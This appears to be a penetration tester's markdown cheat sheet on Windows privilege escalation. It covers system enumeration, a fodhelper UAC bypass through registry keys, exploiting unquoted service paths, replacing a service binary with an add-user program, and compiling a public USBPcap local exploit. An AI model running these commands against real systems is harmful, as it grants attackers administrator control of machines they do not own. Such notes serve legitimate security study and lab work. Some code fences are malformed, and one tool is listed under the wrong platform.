# Privilege_Escalation_Windows

## reference

<https://www.fuzzysecurity.com/tutorials/16.html>

### LOLBAS

<https://lolbas-project.github.io/>

### Sysinterals Suite

<https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite>

## information gathering

```cmd
systeminfo
whoami
net user
net user <username>

```

```powershell
Get-ComputerInfo
```

## UAC bypass

```cmd

Win10 build 1709, 1809 ...
C:\Windows\System32\fodhelper.exe

```cmd
sigcheck.exe -a -m c:\windows\system32\fodhelper.exe

REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

## file permission

```powershell
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like "Running"}
```

### space in the path & unclosed quotes

```cmd
C:\Program Files\VMware\VMware Tools\VMwareUser.exe

C:\Program.exe
C:\Program Files\VMware\VMware.exe
```

### full control file replacement

```bash
i686-w64-mingw32-gcc adduser.c -o adduser.exe
```

```cmd
icacls "C:\Program Files\Serviio\bin\ServiioService.exe"

move ServiioService.exe ServiioService.exe.bak
move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

whoami /priv
shutdown /r /t 0
net localgroup administrators
```

## kernel vulnerability

```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
driverquery /v
USBPcap
cd "C:\Windows\System32\drivers"
type USBPcap.inf
```

```bash
searchsploit USBPcap
USBPcap 1.1.0.0 (WireShark 2.2.5) - Local Privilege Escalation      |       windows/local/41542.c
i686-w64-mingw32-gcc 41542.c -o 41542.exe
```

## Tips

- linpeas
